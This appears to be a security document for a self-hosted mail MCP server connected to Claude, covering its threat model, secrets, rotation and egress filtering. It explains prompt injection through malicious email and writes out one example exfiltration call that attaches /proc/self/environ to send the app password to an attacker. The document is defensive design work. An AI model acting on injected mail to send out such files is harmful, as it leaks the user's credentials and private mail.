# Security

## Threat model

| Asset | Where | Impact if leaked |
|---|---|---|
| GMX app password | `/etc/mcp-host/gmx.env`, env of the `gmx` container | Full IMAP **and SMTP** access to the mailbox (GMX app passwords cannot be scoped) |
| Mailbox content | GMX; transiently in `gmx` RAM (metadata index on tmpfs) and in Claude conversations | Privacy |
| Upstream tokens | `/etc/mcp-host/gateway.env`, the portal's server entries | Direct access to that MCP server, bypassing the portal's login |
| Tunnel token | `/etc/mcp-host/tunnel.env` | Someone else can serve traffic for the tunnel's hostnames |

| Adversary | Main controls |
|---|---|
| Internet scanner hitting `mail-mcp.fabiserver.de` directly (the portal does **not** protect it) | Gateway requires that server's 64-hex bearer token; unknown hosts/paths 404; no published ports, only an outbound tunnel |
| Malicious email content (prompt injection) | Read + drafts only: **no SMTP configured**, mutations limited to `draft`; portal allowlist hides everything else; claude.ai per-tool permissions |
| Stolen claude.ai/Claude Code session | Cloudflare Access: One-time PIN to your address only; 10 min access tokens, 14 day grant, policy re-checked on refresh |
| Compromised MCP server container | Non-root, read-only rootfs, no capabilities, no-new-privileges, own internal network per server (servers cannot reach each other), no Docker socket, CPU/memory/pid limits |
| Compromised upstream image | Pinned by digest; updates only via reviewed PRs (Renovate) and `./mcp update`; weekly trivy scan |
| Other VMs on the LAN | Proxmox firewall: VM cannot reach RFC1918 except router DNS/DHCP; Docker runs in its own VM, not an LXC |

### Why there is no sending (important)

`mcp-email-server` 1.11.0 lets `send_email`, `save_draft` and `save_to_mailbox`
attach **any file the server process can read**, by path, with no allow-root.
That includes `/proc/self/environ`, which holds the GMX app password. One
prompt-injected `send_email(recipients=[attacker], attachments=["/proc/self/environ"])`
would leak the password. No config mode prevents this (the process must be able
to read its own credential), and a read-only filesystem does not help.

So `MCP_EMAIL_SERVER_SMTP_HOST` is forced to `""` in compose (it overrides the
env file) and `send` is not an allowed mutation. With drafts only, the worst a
malicious mail can achieve is a draft (possibly with such an attachment) in
**your own** Drafts folder. You send mail yourself from GMX.

**Do not enable SMTP** unless a request filter in front of the server rejects
any `tools/call` that carries an `attachments` argument (Caddy cannot inspect
JSON-RPC bodies; this needs a small purpose-built proxy), or upstream adds an
attachment allow-root. Even then keep `send_email` on **Ask** and check
`cc`/`bcc`/`reply_to` in every confirmation.

### Residual risks

- **Exfiltration through Claude itself.** Mail content Claude reads can flow
  into other tools in the same conversation (web fetch, other connectors). Keep
  claude.ai tools that make outbound requests on **Ask** in chats where you read mail.
- **Drafts containing local files.** See above; delete unexpected drafts.
- **Cloudflare is in the trust path.** It terminates TLS and holds the
  upstream tokens in the portal configuration.
- **No independent MFA** for servers authorized via the portal (Cloudflare limitation).
- **Gateway token comparison is not constant-time** (Caddy header matcher).
  With 256-bit random tokens behind Cloudflare's edge and the tunnel, a timing
  attack is not practical. The optional Access service token (RUNBOOK, last
  section) adds an edge-enforced layer if you want one.
- **Egress is not port-filtered by default.** `gmx` can reach any internet
  host from its own `gmx-egress` network. Optional filtering is described below.
- **docker group = root.** Anyone in it can read every secret via `docker inspect`.
  The VM has one admin.

## Secrets

| Secret | File (mode 600, dir `/etc/mcp-host` mode 700) | Also stored in |
|---|---|---|
| GMX app password | `gmx.env` (`MCP_EMAIL_SERVER_PASSWORD`) | your password manager (optional) |
| Upstream token per server | `gateway.env` (`<NAME>_UPSTREAM_TOKEN`) | portal server entry (Custom headers) |
| Tunnel token | `tunnel.env` (`TUNNEL_TOKEN`) | Cloudflare (retrievable from the dashboard) |

Nothing secret is ever committed: `.gitignore` excludes `*.env`, CI and the
pre-commit hook run gitleaks.

### Rotation

| Secret | Steps |
|---|---|
| GMX app password | GMX → Anwendungsspezifische Passwörter → create a new one → put it in `gmx.env` → `./mcp up` (recreates `gmx`) → delete the old one in GMX |
| Upstream token | `./mcp token gmx --rotate` → paste the printed JSON into the portal server's Custom headers → `./mcp restart gateway` → `./mcp verify gmx --public` (short outage between the two edits) |
| Tunnel token | Tunnel → **Refresh token** (or delete + recreate the tunnel and its public hostnames) → `tunnel.env` → `./mcp up` |

Rotate everything once a year, and immediately if the VM or a backup may have leaked.

### Emergency revoke

1. `./mcp down`.
2. GMX: delete the `mcp-homelab` app password (this alone cuts all mail access).
3. Cloudflare: disable the portal's Access policy, or delete the tunnel.
4. claude.ai: remove the connector.

## Operations

### Adding / removing a server

`./mcp add <name> --image <ref@sha256> --port <port> [--egress]` scaffolds
`servers/<name>/` from `templates/server/` (hardened service, per-server
internal network, gateway route, token) and prints the Cloudflare steps.
Finish the TODOs (command, healthcheck, policy env), fill
`/etc/mcp-host/<name>.env`, then `./mcp up && ./mcp verify <name>`.

`./mcp remove <name>` stops the container, deletes the directory, token,
secrets file and networks, recreates the gateway and prints the Cloudflare cleanup.

Before exposing a new server: read its tool list, decide the allowlist
(`servers/<name>/tools.json`), and look for the same class of problem as
above: tools that read local files or make outbound requests.

### Updates

- **Renovate** (install the GitHub app on this repo) opens PRs for new image
  tags/digests and GitHub Action SHAs. Nothing auto-merges.
- Without Renovate: `./mcp update` shows whether a pinned tag now points to a
  different digest; bump tags manually.
- After merging: `git pull && ./mcp up && ./mcp verify && ./mcp inspect`.
- Mail server bumps: check the changelog for new tools/env vars; new tools stay
  hidden by the portal allowlist, but re-check that unset policy vars still fail closed.
- `./mcp scan` (also weekly in CI) fails on fixable CRITICAL CVEs.
- The guest OS gets security updates via unattended-upgrades.

### Backups

Only `/etc/mcp-host/` holds state (secrets). Everything else is in git or
rebuildable (the gmx metadata index lives in RAM). A Proxmox backup job of
the VM covers it; alternatively keep the three values in your password
manager and rebuild from the runbook.

### Debugging a failing connector

| Symptom | Look at |
|---|---|
| claude.ai: "Authorization with the MCP server failed" | Portal 401 + `WWW-Authenticate` (`./mcp verify gmx --public`); redirect URIs in the portal app; Bot Fight Mode / AI bot blocking / WAF events for `160.79.104.0/21`; `ofid_` reference |
| Portal server not **Ready** | `./mcp logs gateway` (401 = Custom headers don't match `./mcp token gmx`); `./mcp verify gmx --public`; tunnel health |
| Tools missing in claude.ai | Portal allowlist; **Sync capabilities** (auto-sync is ~2 h); claude.ai per-tool settings |
| Tool calls fail after a restart | `gmx` sessions are in memory; reconnect the connector if the portal does not re-initialize |
| IMAP errors | `./mcp logs gmx`; IMAP enabled in GMX; app password in `gmx.env` |

The gateway logs method, host, path, status and duration as JSON, never
headers or bodies. Never run cloudflared with `--loglevel debug`; it logs all
request headers, including upstream tokens.

### Optional: port-filtering gmx egress

`gmx` egresses through the bridge `mcp-gmx-egress` (fixed name). To restrict it
to IMAPS and DNS, add host rules to Docker's `DOCKER-USER` chain (not yet
tested on the VM; check with `iptables -L DOCKER-USER -v` after a restart):

```bash
# /usr/local/sbin/mcp-egress.sh, run after docker.service (e.g. a oneshot unit with After=docker.service)
iptables -N MCP-GMX 2>/dev/null || iptables -F MCP-GMX
iptables -A MCP-GMX -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN
iptables -A MCP-GMX -p tcp --dport 993 -j RETURN
iptables -A MCP-GMX -p udp --dport 53 -j RETURN
iptables -A MCP-GMX -p tcp --dport 53 -j RETURN
iptables -A MCP-GMX -j DROP
iptables -C DOCKER-USER -i mcp-gmx-egress -j MCP-GMX 2>/dev/null || iptables -I DOCKER-USER -i mcp-gmx-egress -j MCP-GMX
```

Filtering by destination IP is deliberately not done: GMX's addresses change.
